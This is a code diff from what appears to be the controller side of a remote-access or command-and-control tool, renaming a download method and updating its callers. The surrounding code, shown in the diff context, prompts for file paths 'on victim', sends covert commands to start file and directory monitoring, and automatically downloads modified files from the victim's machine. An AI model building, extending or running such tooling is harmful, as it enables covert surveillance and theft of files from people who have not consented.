@@ -206,7 +206,7 @@ class Commander:
         self.connected = False
         print("[*] Disconnected from victim.")
 
-    def download_file_with_debug(self, remote_path: str, local_path: str, timeout=60):
+    def download_file(self, remote_path: str, local_path: str, timeout=60):
         """
         download remote_path file and print chunk debug message
         """
@@ -346,7 +346,7 @@ def cmd_put_file(comm: Commander):
 def cmd_get_file(comm: Commander):
     remote = input("Enter file path on victim to download: ").strip()
     local = input("Enter local save path: ").strip() or os.path.basename(remote)
-    comm.download_file_with_debug(remote, local)
+    comm.download_file(remote, local)
 
 
 def cmd_monitor_file(comm: Commander):
@@ -373,7 +373,7 @@ def cmd_monitor_file(comm: Commander):
                 print(f"[{msg.get('timestamp', '')}] File Modified：{path}")
                 try:
                     local_name = os.path.basename(path)
-                    if not comm.download_file_with_debug(path, local_name):
+                    if not comm.download_file(path, local_name):
                         print(f"[!] Download failed：{path}")
                 except Exception as e:
                     print(f"[!] Exception occurred while downloading：{e}")
@@ -386,7 +386,7 @@ def cmd_monitor_file(comm: Commander):
 def cmd_monitor_dir(comm: Commander):
     dir_path = input("Enter directory path on victim to monitor: ").strip()
     print(f"[Commander] Start monitoring directory：{dir_path}")
-    # Send Start Monitor command to victim
+    # Send Start Monitor command to a victim
     comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
 
     processed = set()
@@ -436,7 +436,7 @@ def cmd_monitor_dir(comm: Commander):
             # —— Perform download ——
             try:
                 local_name = os.path.basename(remote_file)
-                if comm.download_file_with_debug(remote_file, local_name):
+                if comm.download_file(remote_file, local_name):
                     print(f"[*] Download Completed：{local_name}")
                 else:
                     print(f"[!] Download failed：{remote_file}")
